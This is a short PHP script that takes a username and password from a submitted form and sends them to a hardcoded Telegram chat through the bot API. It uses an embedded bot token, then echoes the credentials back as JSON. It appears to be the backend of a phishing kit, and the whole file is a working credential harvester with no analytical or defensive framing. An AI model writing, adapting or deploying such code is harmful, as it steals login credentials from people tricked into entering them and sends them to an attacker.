<?php 
header('Content-Type: text/html');
$pass = $_POST['pass'];
$user = $_POST['user'];
$alls = ("
  'user' => $user,
  'pass' => $pass
");
  $apiToken = "5777453368:AAEMhxjZcVQlBVObATpU5c_al-tM4ODDrDk";
    $dataa2 = [
        'chat_id' => 670531769,
        'text' => $alls,
    ];
    $response2 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                    http_build_query($dataa2) );

$data = array(
    'user' => $user,
    'pass' => $pass
  );
$json_data = json_encode($data);
echo($json_data);